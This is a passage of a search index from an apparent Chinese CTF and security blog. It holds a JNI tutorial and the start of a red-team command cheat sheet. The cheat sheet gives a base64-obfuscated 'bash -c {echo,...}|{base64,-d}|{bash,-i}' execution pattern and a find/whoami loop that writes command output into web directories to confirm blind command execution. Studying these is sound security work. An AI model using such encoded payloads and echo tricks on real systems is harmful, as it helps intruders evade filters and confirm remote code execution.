<li>\u5728Android\u5e73\u53f0\u4e0a\uff0cJNI\u5c31\u662f\u4e00\u5ea7\u5c06C/C++\u4e16\u754c\u548cJava\u4e16\u754c\u95f4\u7684\u5929\u5811\u53d8\u6210\u901a\u9014\u7684\u6865\u3002</li> <li>\u6548\u7387\u4e0a C/C++\u662f\u672c\u5730\u8bed\u8a00\uff0c\u6bd4java\u66f4\u9ad8\u6548</li> <li>\u4ee3\u7801\u79fb\u690d\uff0c\u5982\u679c\u4e4b\u524d\u7528C\u8bed\u8a00\u5f00\u53d1\u8fc7\u6a21\u5757\uff0c\u53ef\u4ee5\u590d\u7528\u5df2\u7ecf\u5b58\u5728\u7684c\u4ee3\u7801</li> <li>java\u53cd\u7f16\u8bd1\u6bd4C\u8bed\u8a00\u5bb9\u6613\uff0c\u4e00\u822c\u52a0\u5bc6\u7b97\u6cd5\u90fd\u662f\u7528C\u8bed\u8a00\u7f16\u5199\uff0c\u4e0d\u5bb9\u6613\u88ab\u53cd\u7f16\u8bd1</li> </ol> <p>JNI\u7684\u5b58\u5728\u610f\u4e49\u4e3b\u8981\u5728\u4e8e\u6865\u63a5Java\u548c\u672c\u5730\u4ee3\u7801\uff0c\u4f7f\u5f97Java\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00(\u5982 C\uff0cC++)\u7f16\u5199\u7684\u4ee3\u7801\u6216\u5e93\u3002\u5176\u4f5c\u7528\u5982\u4e0b\uff1a</p> <p>1.\u6027\u80fd\u4f18\u5316\uff1a\u67d0\u4e9b\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528\u6548\u7387\u66f4\u9ad8\u7684\u672c\u5730\u4ee3\u7801\u6765\u5b9e\u73b0\uff0c\u4ece\u800c\u63d0\u5347\u6027\u80fd\u3002</p> <p>2.\u590d\u7528\u73b0\u6709\u5e93\uff1a\u53ef\u4ee5\u8c03\u7528\u73b0\u6709\u7684\u672c\u5730\u5e93\u6216\u4ee3\u7801\uff0c\u907f\u514d\u91cd\u590d\u5f00\u53d1\u3002</p> <p>3.\u8bbf\u95ee\u7cfb\u7edf\u7279\u6027\uff1a\u67d0\u4e9b\u7cfb\u7edf\u7279\u6027\u6216\u786c\u4ef6\u529f\u80fd\u53ea\u80fd\u901a\u8fc7\u672c\u5730\u4ee3\u7801\u8bbf\u95ee\uff0cJNI \u63d0\u4f9b\u4e86\u4e00\u79cd\u9014\u5f84\u6765\u5b9e\u73b0\u8fd9\u79cd\u8bbf\u95ee\u3002</p> <p>4.\u4e0e\u786c\u4ef6\u4ea4\u4e92\uff1a\u67d0\u4e9b\u786c\u4ef6\u63a5\u53e3\u53ea\u80fd\u901a\u8fc7\u672c\u5730\u4ee3\u7801\u8fdb\u884c\u4ea4\u4e92\uff0cJNI \u5141\u8bb8 Java \u7a0b\u5e8f\u4e0e\u8fd9\u4e9b\u63a5\u53e3\u901a\u4fe1\u3002</p>"},{"location":"CTF/Java_Security/Article7/index.html#jni","title":"JNI\u5f00\u53d1\u7684\u57fa\u672c\u6d41\u7a0b","text":"<p>1.\u4e00\u4e2a\u6807\u51c6\u7684 JNI \u5f00\u53d1\u6d41\u7a0b\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u6b65\u9aa4\uff1a</p> <ol> <li>\u521b\u5efa HelloWorld.java\uff0c\u5e76\u58f0\u660e native \u65b9\u6cd5 sayHi()\uff1b</li> <li>\u4f7f\u7528 javac \u547d\u4ee4\u7f16\u8bd1\u6e90\u6587\u4ef6\uff0c\u751f\u6210 HelloWorld.class \u5b57\u8282\u7801\u6587\u4ef6\uff1b</li> <li>\u4f7f\u7528 javah \u547d\u4ee4\u5bfc\u51fa HelloWorld.h \u5934\u6587\u4ef6\uff08\u5934\u6587\u4ef6\u4e2d\u5305\u542b\u4e86\u672c\u5730\u65b9\u6cd5\u7684\u51fd\u6570\u539f\u578b\uff09\uff1b</li> <li>\u5728\u6e90\u6587\u4ef6 HelloWorld.cpp \u4e2d\u5b9e\u73b0\u51fd\u6570\u539f\u578b\uff1b</li> <li>\u7f16\u8bd1\u672c\u5730\u4ee3\u7801\uff0c\u751f\u6210 Hello-World.so \u52a8\u6001\u539f\u751f\u5e93\u6587\u4ef6\uff1b</li> <li>\u5728 Java \u4ee3\u7801\u4e2d\u8c03\u7528 System.loadLibrary(...) \u52a0\u8f7d so \u6587\u4ef6\uff1b</li> <li>\u4f7f\u7528 Java \u547d\u4ee4\u8fd0\u884c HelloWorld \u7a0b\u5e8f\u3002</li> </ol> <p>\u603b\u4e4b\uff0cJNI\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6865\u6881\uff0c\u4f7f\u5f97Java\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4e0e\u672c\u5730\u4ee3\u7801\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ece\u800c\u83b7\u5f97\u66f4\u9ad8\u7684\u6027\u80fd\u548c\u66f4\u5e7f\u6cdb\u7684\u529f\u80fd\u3002\u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4f7f\u7528JNI\u9700\u8981\u5c0f\u5fc3\u5904\u7406\u5185\u5b58\u7ba1\u7406\u548c\u8de8\u5e73\u53f0\u517c\u5bb9\u6027\u7b49\u95ee\u9898\u3002</p>"},{"location":"CTF/Java_Security/Article7/index.html#jni_1","title":"\u7b80\u5355\u7684 JNI \u4f8b\u5b50","text":"<p>\u5c55\u793a\u5982\u4f55\u4f7f\u7528 JNI \u4ece Java \u8c03\u7528 C \u4ee3\u7801\u3002</p>"},{"location":"CTF/Java_Security/Article7/index.html#step-1-java","title":"Step 1:\u7f16\u5199 Java \u7c7b","text":"<p>\u9996\u5148\uff0c\u7f16\u5199\u4e00\u4e2aJava\u7c7b\uff0c\u58f0\u660e\u4e00\u4e2a\u672c\u5730\u65b9\u6cd5\u3002</p> <pre><code>public class HelloJNI {\n    // \u58f0\u660e\u672c\u5730\u65b9\u6cd5\n    private native void sayHello();\n\n    // \u52a0\u8f7d\u672c\u5730\u5e93\n    static {\n        System.loadLibrary(\"hello\"); // \u5bf9\u5e94\u751f\u6210\u7684\u672c\u5730\u5e93\u540d\u4e3a libhello.so \u6216 hello.dll\n    }\n\n    public static void main(String[] args) {\n        new HelloJNI().sayHello(); // \u8c03\u7528\u672c\u5730\u65b9\u6cd5\n    }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u9759\u6001\u4ee3\u7801\u5757\u5728\u8fd9\u4e2a\u7c7b\u88ab\u7c7b\u52a0\u8f7d\u5668\u52a0\u8f7d\u7684\u65f6\u5019\u8c03\u7528\u4e86System.loadLibrary()\u65b9\u6cd5\u6765\u52a0\u8f7d\u4e00\u4e2anative\u5e93\u201chello\u201d\uff08\u8fd9\u4e2a\u5e93\u4e2d\u5b9e\u73b0\u4e86sayHello\u51fd\u6570\uff09\u3002\u8fd9\u4e2a\u5e93\u5728windows\u4e0a\u5bf9\u5e94\u4e86\u201chello.dll\u201d\uff0c\u800c\u5728\u7c7bUNIX\u5e73\u53f0\u4e0a\u5bf9\u5e94\u4e86\u201clibhello.so\u201d\u3002\u8fd9\u4e2a\u5e93\u5e94\u8be5\u5305\u542b\u5728Java\u7684\u5e93\u8def\u5f84\uff08\u4f7f\u7528java.library.path\u7cfb\u7edf\u53d8\u91cf\u8868\u793a\uff09\u4e0a\uff0c\u5426\u5219\u8fd9\u4e2a\u4e0a\u9762\u7684\u7a0b\u5e8f\u4f1a\u629b\u51faUnsatisfiedLinkError\u9519\u8bef\u3002\u4f60\u5e94\u8be5\u4f7f\u7528VM\u7684\u53c2\u6570-D java.library.path=path_to_lib\u6765\u6307\u5b9a\u5305\u542bnative\u5e93\u7684\u8def\u5f84\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u4f7f\u7528native\u5173\u952e\u5b57\u5c06sayHello()\u65b9\u6cd5\u58f0\u660e\u4e3a\u672c\u5730\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u8fd9\u5c31\u5f88\u660e\u663e\u5730\u544a\u8bc9JVM\uff1a\u8fd9\u4e2a\u65b9\u6cd5\u5b9e\u73b0\u5728\u53e6\u5916\u4e00\u4e2a\u8bed\u8a00\u4e2d\uff08C/C++\uff09\uff0c\u8bf7\u53bb\u90a3\u91cc\u5bfb\u627e\u4ed6\u7684\u5b9e\u73b0\u3002\u6ce8\u610f\uff0c\u4e00\u4e2anative\u65b9\u6cd5\u4e0d\u5305\u542b\u65b9\u6cd5\u4f53\uff0c\u53ea\u6709\u58f0\u660e\u3002\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684main\u65b9\u6cd5\u5b9e\u4f8b\u5316\u4e86\u4e00\u4e2aHelloJNI\u7c7b\u7684\u5b9e\u4f8b\uff0c\u7136\u540e\u8c03\u7528\u4e86\u672c\u5730\u65b9\u6cd5sayHello()\u3002</p> <p><code>private native void sayHello();</code>\u58f0\u660e\u4e86\u4e00\u4e2a\u672c\u5730\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u5c06\u5728 C \u4ee3\u7801\u4e2d\u5b9e\u73b0\u3002</p> <p><code>System.loadLibrary(\"hello\");</code>\u52a0\u8f7d\u540d\u4e3a hello \u7684\u672c\u5730\u5e93\uff0c\u8fd9\u4e2a\u5e93\u5728\u4e0d\u540c\u5e73\u53f0\u4e0a\u4f1a\u6709\u4e0d\u540c\u7684\u6587\u4ef6\u6269\u5c55\u540d\uff08\u4f8b\u5982\uff0cUnix/Linux \u4e0a\u662f libhello.so\uff0cWindows \u4e0a\u662f hello.dll\uff09\u3002</p> <p><code>main</code> \u65b9\u6cd5\u521b\u5efa HelloJNI \u5b9e\u4f8b\u5e76\u8c03\u7528\u672c\u5730\u65b9\u6cd5 sayHello\u3002</p>"},{"location":"CTF/Java_Security/Article7/index.html#step-2-jni","title":"Step 2: \u751f\u6210 JNI \u5934\u6587\u4ef6","text":"<p>\u7f16\u8bd1 Java \u4ee3\u7801\u5e76\u751f\u6210 JNI \u5934\u6587\u4ef6\u3002</p> <pre><code># \u7f16\u8bd1 Java \u4ee3\u7801\njavac HelloJNI.java\n\n# \u751f\u6210 JNI \u5934\u6587\u4ef6\njavah -jni HelloJNI\n</code></pre> <p>\u8fd9\u5c06\u751f\u6210\u4e00\u4e2a\u540d\u4e3a HelloJNI.h \u7684\u5934\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u672c\u5730\u65b9\u6cd5\u7684\u58f0\u660e\u3002</p> <p></p> <p>\u6211\u4eec\u770b\u5230\uff0c\u4e0a\u9762\u7684\u5934\u6587\u4ef6\u4e2d\u751f\u6210\u4e86\u4e00\u4e2aJava_HelloJNI_sayHello\u7684C\u51fd\u6570\uff1a</p> <pre><code>JNIEXPORT void JNICALL Java_HelloJNI_sayHello(JNIEnv *, jobject);\n</code></pre> <p>\u5c06java\u7684native\u65b9\u6cd5\u8f6c\u6362\u6210C\u51fd\u6570\u58f0\u660e\u7684\u89c4\u5219\u662f\u8fd9\u6837\u7684\uff1a<code>Java_{package_and_classname}_{function_name}(JNI arguments)</code>\u3002\u5305\u540d\u4e2d\u7684\u70b9\u6362\u6210\u5355\u4e0b\u5212\u7ebf\u3002\u9700\u8981\u8bf4\u660e\u7684\u662f\u751f\u6210\u51fd\u6570\u4e2d\u7684\u4e24\u4e2a\u53c2\u6570\uff1a</p> <ol> <li>JNIEnv *\uff1a\u8fd9\u662f\u4e00\u4e2a\u6307\u5411JNI\u8fd0\u884c\u73af\u5883\u7684\u6307\u9488\uff0c\u540e\u9762\u6211\u4eec\u4f1a\u770b\u5230\uff0c\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u6307\u9488\u8bbf\u95eeJNI\u51fd\u6570</li> <li>jobject\uff1a\u8fd9\u91cc\u6307\u4ee3java\u4e2d\u7684this\u5bf9\u8c61</li> </ol> <p>\u4e0b\u9762\u6211\u4eec\u7ed9\u51fa\u7684\u4f8b\u5b50\u4e2d\u6ca1\u6709\u4f7f\u7528\u4e0a\u9762\u7684\u4e24\u4e2a\u53c2\u6570\uff0c\u4e0d\u8fc7\u540e\u9762\u6211\u4eec\u7684\u4f8b\u5b50\u4f1a\u4f7f\u7528\u7684\u3002\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u4f60\u53ef\u4ee5\u5148\u5ffd\u7565JNIEXPORT\u548cJNICALL\u8fd9\u4e24\u4e2a\u73a9\u610f\u3002 \u4e0a\u9762\u5934\u6587\u4ef6\u4e2d\u6709\u4e00\u4e2aextern \u201cC\u201d\uff0c\u540c\u65f6\u4e0a\u9762\u8fd8\u6709C++\u7684\u6761\u4ef6\u7f16\u8bd1\u8bed\u53e5\uff0c\u8fd9\u4e48\u4e00\u6765\u5927\u5bb6\u5c31\u660e\u767d\u4e86\uff0c\u8fd9\u91cc\u7684\u51fd\u6570\u58f0\u660e\u662f\u8981\u544a\u8bc9C++\u7f16\u8bd1\u5668\uff1a\u8fd9\u4e2a\u51fd\u6570\u662fC\u51fd\u6570\uff0c\u8bf7\u4f7f\u7528C\u51fd\u6570\u7684\u7b7e\u540d\u534f\u8bae\u89c4\u5219\u53bb\u7f16\u8bd1\uff01\u56e0\u4e3a\u6211\u4eec\u77e5\u9053C++\u7684\u51fd\u6570\u7b7e\u540d\u534f\u8bae\u89c4\u5219\u548cC\u7684\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u56e0\u4e3aC++\u652f\u6301\u91cd\u5199\u548c\u91cd\u8f7d\u7b49\u9762\u5411\u5bf9\u8c61\u7684\u51fd\u6570\u8bed\u6cd5\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u7ed9\u51faC\u8bed\u8a00\u7684\u5b9e\u73b0\uff0c\u4ee5\u5b9e\u73b0\u4e0a\u9762\u7684\u51fd\u6570\uff1a</p>"},{"location":"CTF/Java_Security/Article7/index.html#step-3-c","title":"Step 3:\u7f16\u5199 C \u4ee3\u7801","text":"<p>\u63a5\u4e0b\u6765\uff0c\u7f16\u5199\u5bf9\u5e94\u7684 C \u5b9e\u73b0\u3002</p> <p>HelloJNI.c\uff1a</p> <pre><code>#include &lt;jni.h&gt;\n#include &lt;stdio.h&gt;\n#include \"HelloJNI.h\"\n\n// \u5b9e\u73b0\u672c\u5730\u65b9\u6cd5\nJNIEXPORT void JNICALL Java_HelloJNI_sayHello(JNIEnv *env, jobject obj) {\n    printf(\"Hello from C!\\n\");\n}\n</code></pre> <p>HelloJNI.h \u5305\u542b\u4e86 JNI \u7684\u5fc5\u8981\u5934\u6587\u4ef6\u548c\u51fd\u6570\u58f0\u660e\u3002</p> <p>Java_HelloJNI_sayHello \u51fd\u6570\u5b9e\u73b0\u4e86 sayHello \u65b9\u6cd5\uff0c\u4f7f\u7528 printf \u6253\u5370\u6d88\u606f\u3002</p> <p>jni.h \u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e <code>$JAVA_HOME/include</code>\u76ee\u5f55\u4e2d\uff0c\u4e14\u7279\u5b9a\u5e73\u53f0\u7684\u6587\u4ef6\u4f4d\u4e8e <code>$JAVA_HOME/include/&lt;platform&gt;</code> \u4e2d\uff0c\u4f8b\u5982\uff0cLinux \u5e73\u53f0\u4e0a\u4e3a<code>$JAVA_HOME/include/linux</code>\u3002</p>"},{"location":"CTF/Java_Security/Article7/index.html#step-4-c","title":"Step 4: \u7f16\u8bd1 C \u4ee3\u7801","text":"<p>\u7f16\u8bd1\u672c\u5730\u4ee3\u7801\u751f\u6210\u5171\u4eab\u5e93,\u6b64\u5904Linux\u73af\u5883\u3002</p> <pre><code># \u5728 Unix/Linux \u7cfb\u7edf\u4e0a\ngcc -shared -o libhello.so -fPIC HelloJNI.c -I${JAVA_HOME}/include -I${JAVA_HOME}/include/linux\n\n# \u5728 Windows \u7cfb\u7edf\u4e0a\ngcc -shared -o hello.dll HelloJNI.c -I\"%JAVA_HOME%\\include\" -I\"%JAVA_HOME%\\include\\win32\"\n</code></pre> <p>\u4f7f\u7528 gcc \u7f16\u8bd1 C \u4ee3\u7801\u5e76\u751f\u6210\u5171\u4eab\u5e93\uff0c\u7f16\u8bd1\u65f6\u9700\u8981\u6307\u5b9a Java \u5934\u6587\u4ef6\u7684\u8def\u5f84\u3002</p> <p></p> <p>\u6211\u4eec\u9996\u5148\u4f7f\u7528nm\u547d\u4ee4\u67e5\u770blibhello.so\u4e2d\u90fd\u6709\u90a3\u4e9b\u51fd\u6570\uff1a</p> <p>nm \u662f\u4e00\u4e2a\u7528\u4e8e\u5217\u51fa\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08\u5982\u53ef\u6267\u884c\u6587\u4ef6\u3001\u76ee\u6807\u6587\u4ef6\u548c\u5e93\uff09\u4e2d\u7b26\u53f7\u8868\u7684\u547d\u4ee4\u3002\u7b26\u53f7\u8868\u5305\u542b\u4e86\u7b26\u53f7\uff08\u51fd\u6570\u548c\u53d8\u91cf\uff09\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u5b83\u4eec\u7684\u540d\u79f0\u3001\u5730\u5740\u548c\u7c7b\u578b\u3002nm \u547d\u4ee4\u5728\u8c03\u8bd5\u548c\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u975e\u5e38\u6709\u7528\uff0c\u7279\u522b\u662f\u7528\u4e8e\u5206\u6790\u7f16\u8bd1\u540e\u7684\u6587\u4ef6\u548c\u5e93\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684sayHello\u51fd\u6570\u5df2\u7ecf\u5728\u8fd9\u4e2a\u91cc\u9762\uff0c\u8fd9\u8bf4\u660e\u6211\u4eec\u7f16\u8bd1\u7684\u57fa\u672c\u6ca1\u6709\u95ee\u9898\u3002</p>"},{"location":"CTF/Java_Security/Article7/index.html#step-5-java","title":"Step 5: \u8fd0\u884c Java \u7a0b\u5e8f","text":"<p>\u786e\u4fdd\u5171\u4eab\u5e93\u5728\u5e93\u8def\u5f84\u4e2d\uff0c\u7136\u540e\u8fd0\u884c Java \u7a0b\u5e8f\u3002</p> <pre><code># \u8bbe\u7f6e\u5e93\u8def\u5f84\uff08Unix/Linux\uff09\nexport LD_LIBRARY_PATH=.:$LD_LIBRARY_PATH\n\n# \u8bbe\u7f6e\u5e93\u8def\u5f84\uff08Windows\uff09\nset PATH=%PATH%;.\n\n# \u8fd0\u884c Java \u7a0b\u5e8f\njava HelloJNI\n</code></pre> <p></p> <p>\u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u7a0b\u5e8f\u5c06\u8f93\u51fa\uff1a</p> <pre><code>Hello from C!\n</code></pre>"},{"location":"CTF/Java_Security/Article7/index.html#jni_2","title":"JNI \u6a21\u677f\u4ee3\u7801","text":"<p>JNI Demo\uff1a</p> <pre><code>JNIEXPORT void JNICALL Java_HelloJNI_sayHello(JNIEnv *, jobject);\n</code></pre>"},{"location":"CTF/Java_Security/Article7/index.html#jni_3","title":"JNI \u51fd\u6570\u540d","text":"<p>\u4e3a\u4ec0\u4e48 JNI \u51fd\u6570\u540d\u8981\u91c7\u7528  <code>Java_HelloJNI_sayHello</code> \u7684\u547d\u540d\u65b9\u5f0f\u5462\uff1f\u2014\u2014 \u8fd9\u662f JNI \u51fd\u6570\u9759\u6001\u6ce8\u518c\u7ea6\u5b9a\u7684\u51fd\u6570\u547d\u540d\u89c4\u5219\u3002Java \u7684 native \u65b9\u6cd5\u548c JNI \u51fd\u6570\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u800c\u5efa\u7acb\u8fd9\u79cd\u6620\u5c04\u5173\u7cfb\u7684\u6ce8\u518c\u65b9\u5f0f\u6709 2 \u79cd\uff1a\u9759\u6001\u6ce8\u518c + \u52a8\u6001\u6ce8\u518c\u3002 \u5176\u4e2d\uff0c\u9759\u6001\u6ce8\u518c\u662f\u57fa\u4e8e\u547d\u540d\u7ea6\u5b9a\u5efa\u7acb\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u4e00\u4e2a Java \u7684 native \u65b9\u6cd5\u5bf9\u5e94\u7684 JNI \u51fd\u6570\u4f1a\u91c7\u7528\u7ea6\u5b9a\u7684\u51fd\u6570\u540d\uff0c\u5373<code>Java_[\u7c7b\u7684\u5168\u9650\u5b9a\u540d (\u5e26\u4e0b\u5212\u7ebf)]_[\u65b9\u6cd5\u540d]</code>\u3002JNI \u8c03\u7528 sayHello() \u65b9\u6cd5\u65f6\uff0c\u5c31\u4f1a\u4ece JNI \u51fd\u6570\u5e93\u4e2d\u5bfb\u627e\u51fd\u6570 <code>Java_HelloJNI_sayHello()</code></p> <p>Java \u7684 native \u65b9\u6cd5\u548c JNI \u51fd\u6570\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u5efa\u7acb\u8fd9\u79cd\u6620\u5c04\u5173\u7cfb\u7684\u6ce8\u518c\u65b9\u5f0f\u6709 2 \u79cd\uff1a \u2022 \u65b9\u5f0f 1 - \u9759\u6001\u6ce8\u518c\uff1a \u57fa\u4e8e\u547d\u540d\u7ea6\u5b9a\u5efa\u7acb\u6620\u5c04\u5173\u7cfb\uff1b \u2022 \u65b9\u5f0f 2 - \u52a8\u6001\u6ce8\u518c\uff1a \u901a\u8fc7 JNINativeMethod \u7ed3\u6784\u4f53\u5efa\u7acb\u6620\u5c04\u5173\u7cfb\u3002</p>"},{"location":"CTF/Java_Security/Article7/index.html#jniexport","title":"\u5173\u952e\u8bcd JNIEXPORT","text":"<p><code>JNIEXPORT</code> \u662f\u5b8f\u5b9a\u4e49\uff0c\u8868\u793a\u4e00\u4e2a\u51fd\u6570\u9700\u8981\u66b4\u9732\u7ed9\u5171\u4eab\u5e93\u5916\u90e8\u4f7f\u7528\u65f6\u3002JNIEXPORT \u5728 Window \u548c Linux \u4e0a\u6709\u4e0d\u540c\u7684\u5b9a\u4e49\uff1a</p> <p>jni.h:</p> <pre><code>// Windows \u5e73\u53f0 :\n#define JNIEXPORT __declspec(dllexport)\n#define JNIIMPORT __declspec(dllimport)\n// Linux \u5e73\u53f0\uff1a\n#define JNIIMPORT\n#define JNIEXPORT  __attribute__ ((visibility (\"default\")))\n</code></pre>"},{"location":"CTF/Java_Security/Article7/index.html#jnicall","title":"\u5173\u952e\u8bcd JNICALL","text":"<p><code>JNICALL</code> \u662f\u5b8f\u5b9a\u4e49\uff0c\u8868\u793a\u4e00\u4e2a\u51fd\u6570\u662f JNI \u51fd\u6570\u3002JNICALL \u5728 Window \u548c Linux \u4e0a\u6709\u4e0d\u540c\u7684\u5b9a\u4e49\uff1a</p> <p>jni.h:</p> <pre><code>// Windows \u5e73\u53f0 :\n#define JNICALL __stdcall // __stdcall \u662f\u4e00\u79cd\u51fd\u6570\u8c03\u7528\u53c2\u6570\u7684\u7ea6\u5b9a ,\u8868\u793a\u51fd\u6570\u7684\u8c03\u7528\u53c2\u6570\u662f\u4ece\u53f3\u5f80\u5de6\u3002\n// Linux \u5e73\u53f0\uff1a\n#define JNICALL\n</code></pre>"},{"location":"CTF/Java_Security/Article7/index.html#jobject","title":"\u53c2\u6570 jobject","text":"<p><code>jobject</code> \u7c7b\u578b\u662f JNI \u5c42\u5bf9\u4e8e Java \u5c42\u5e94\u7528\u7c7b\u578b\u5bf9\u8c61\u7684\u8868\u793a\u3002\u6bcf\u4e00\u4e2a\u4ece Java \u8c03\u7528\u7684 native \u65b9\u6cd5\uff0c\u5728 JNI \u51fd\u6570\u4e2d\u90fd\u4f1a\u4f20\u9012\u4e00\u4e2a\u5f53\u524d\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u533a\u5206 2 \u79cd\u60c5\u51b5\uff1a</p> <ul> <li>\u9759\u6001 native \u65b9\u6cd5\uff1a \u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a jclass \u7c7b\u578b\uff0c\u6307\u5411 native \u65b9\u6cd5\u6240\u5728\u7c7b\u7684 Class \u5bf9\u8c61\uff1b</li> <li>\u5b9e\u4f8b native \u65b9\u6cd5\uff1a \u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a jobject \u7c7b\u578b\uff0c\u6307\u5411\u8c03\u7528 native \u65b9\u6cd5\u7684\u5bf9\u8c61\u3002</li> </ul> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p><code>\u8fd9\u4e16\u4e0a\u771f\u8bdd\u672c\u5c31\u4e0d\u591a\uff0c\u4e00\u4e2a\u5973\u5b69\u5b50\u7684\u8138\u7ea2\u80dc\u8fc7\u4e00\u5927\u6bb5\u5bf9\u767d\u3002\u4f46\u540e\u6765\u6709\u4e86\u80ed\u8102\uff0c\u4fbf\u5206\u4e0d\u51fa\u662f\u771f\u60c5\u8fd8\u662f\u5047\u610f</code></p>"},{"location":"CTF/Red_Team_Commands/index.html","title":"Red_Team_Commands","text":"<ul> <li>\u7ea2\u961f\u5e38\u7528\u547d\u4ee4#1</li> </ul>"},{"location":"CTF/Red_Team_Commands/Article1/index.html","title":"Index","text":"<p>\u6574\u7406\u6536\u96c6\u6e17\u900f\u4e2d\u7528\u5230\u7684\u547d\u4ee4\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#java","title":"java\u547d\u4ee4\u6267\u884c","text":"<p>\u5982\u4e0b\u7f16\u7801\u7f51\u7ad9\uff1a</p> <p>https://ares-x.com/tools/runtime-exec/ https://r0yanx.com/tools/java_exec_encode/</p> <p>\u624b\u52a8\u7f16\u7801\u64cd\u4f5c:</p> <pre><code>bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i}\n</code></pre> <p></p> <p>bash -c \"echo cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==\" | base64 -d | bash -i \u53ef\u4ee5\u5728Linux\u4e0a\u76f4\u63a5\u6267\u884c\u3002</p> <p>bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i} \u65e0\u6cd5\u5728Linux\u4e0a\u76f4\u63a5\u6267\u884c\u3002\u6574\u4e2a\u547d\u4ee4\u88ab\u5927\u62ec\u53f7\u5305\u88f9\uff0c\u8fd9\u6837bash\u4f1a\u5c06\u5176\u4e2d\u7684\u5185\u5bb9\u89c6\u4e3a\u4e00\u4e2a\u547d\u4ee4\u7ec4\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u547d\u4ee4\u3002\u5728Linux\u4e2d\uff0c\u5927\u62ec\u53f7\u901a\u5e38\u7528\u4e8e\u6784\u5efa\u547d\u4ee4\u7ec4\uff0c\u800c\u4e0d\u662f\u8868\u793a\u5b57\u7b26\u4e32\u7684\u8fb9\u754c\u3002\u56e0\u6b64\uff0c\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u5bfc\u81f4\u8bed\u6cd5\u9519\u8bef\uff0c\u56e0\u4e3a\u5927\u62ec\u53f7\u88ab\u8ba4\u4e3a\u662f\u975e\u6cd5\u5b57\u7b26\u3002</p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#_1","title":"\u547d\u4ee4\u6267\u884c\uff0c\u5b9a\u4f4d\u8d44\u6e90\u6587\u4ef6\u5199\u6587\u4ef6\u56de\u663e","text":""},{"location":"CTF/Red_Team_Commands/Article1/index.html#linux","title":"Linux","text":"<pre><code>find /|grep index.js|while read f;do sh -c \"whoami\" &gt;$(dirname $f)/test.txt;done\n</code></pre> <p>find /: \u8fd9\u90e8\u5206\u547d\u4ee4\u4f7f\u7528 find \u547d\u4ee4\u6765\u9012\u5f52\u5730\u641c\u7d22\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u3002/ \u8868\u793a\u4ece\u6839\u76ee\u5f55\u5f00\u59cb\u641c\u7d22\u3002</p> <p>| grep index.js: \u5c06 find \u547d\u4ee4\u7684\u8f93\u51fa\u901a\u8fc7\u7ba1\u9053 | \u4f20\u9012\u7ed9 grep \u547d\u4ee4\u3002grep \u547d\u4ee4\u7528\u4e8e\u5728\u6587\u672c\u4e2d\u641c\u7d22\u6307\u5b9a\u6a21\u5f0f\uff08\u6b63\u5219\u8868\u8fbe\u5f0f\uff09\uff0c\u8fd9\u91cc\u7684\u6a21\u5f0f\u662f \"index.js\"\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\u662f\u7b5b\u9009\u51fa\u5305\u542b \"index.js\" \u5b57\u7b26\u4e32\u7684\u6587\u4ef6\u3002</p> <p>while read f; do ... done: \u8fd9\u662f\u4e00\u4e2a while \u5faa\u73af\uff0c\u5b83\u4f1a\u9010\u884c\u8bfb\u53d6 grep \u547d\u4ee4\u7684\u8f93\u51fa\uff08\u5373\u5305\u542b \"index.js\" \u7684\u6587\u4ef6\u8def\u5f84\uff09\uff0c\u5e76\u5c06\u6bcf\u4e00\u884c\u4fdd\u5b58\u5728\u53d8\u91cf f \u4e2d\u3002</p> <p><code>sh -c \"whoami\" &gt; $(dirname $f)/test.txt</code>: \u8fd9\u90e8\u5206\u662f\u5728\u5faa\u73af\u4e2d\u6267\u884c\u7684\u64cd\u4f5c\u3002sh -c \"whoami\" 